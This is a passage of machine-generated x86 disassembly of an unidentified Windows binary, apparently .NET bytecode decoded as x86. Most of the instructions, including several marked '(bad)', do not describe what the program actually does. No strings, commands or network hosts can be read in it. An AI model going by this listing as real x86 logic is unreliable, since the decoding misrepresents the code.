  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 dc       	add    $0xdc720511,%eax
  4031ba:	22 00                	and    (%eax),%al
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 e4 22       	and    $0x22e47216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 4e    	or     0x4e721825(%edx),%ah
  4031e4:	23 00                	and    (%eax),%eax
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 60    	or     0x60721a25(%edx),%ah
  4031f5:	23 00                	and    (%eax),%eax
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 74             	or     0x74(%edx),%dh
  403227:	23 00                	and    (%eax),%eax
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 d2             	or     -0x2e(%edx),%dh
  403246:	23 00                	and    (%eax),%eax
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 d2             	or     -0x2e(%edx),%dh
  403251:	23 00                	and    (%eax),%eax
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 d6                	jb     0x403299
  4032c3:	23 00                	and    (%eax),%eax
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 e0             	or     %esi,-0x20(%edx)
  4032da:	23 00                	and    (%eax),%eax
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 f4                	jb     0x4032da
  4032e6:	23 00                	and    (%eax),%eax
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 14                	jb     0x403306
  4032f2:	24 00                	and    $0x0,%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 d2             	or     -0x2e(%edx),%dh
  4032fd:	23 00                	and    (%eax),%eax
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 2a                	jb     0x403338
  40330e:	24 00                	and    $0x0,%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 32                	jb     0x403356
  403324:	24 00                	and    $0x0,%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 3e                	jb     0x40336e
  403330:	24 00                	and    $0x0,%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 4e                	jb     0x4034bb
  40346d:	24 00                	and    $0x0,%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 54             	adc    %esi,0x54(%edx)
  4034ae:	24 00                	and    $0x0,%al
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 9a 24    	or     0x249a7209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	b4 24                	mov    $0x24,%ah
  4034ed:	00 70 28             	add    %dh,0x28(%eax)
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 e0             	or     %esi,-0x20(%edx)
  4034fc:	24 00                	and    $0x0,%al
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 ec             	or     -0x14(%edx),%dh
  403510:	24 00                	and    $0x0,%al
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	fc                   	cld
  403521:	24 00                	and    $0x0,%al
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 e0                	jb     0x403511
  403531:	24 00                	and    $0x0,%al
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 0a             	or     0xa(%edx),%dh
  403540:	25 00 70 28 25       	and    $0x25287000,%eax
  403545:	00 00                	add    %al,(%eax)
  403547:	0a 39                	or     (%ecx),%bh
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 20             	adc    %esi,0x20(%edx)
  40362e:	25 00 70 28 3a       	and    $0x3a287000,%eax
  403633:	00 00                	add    %al,(%eax)
  403635:	06                   	push   %es
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
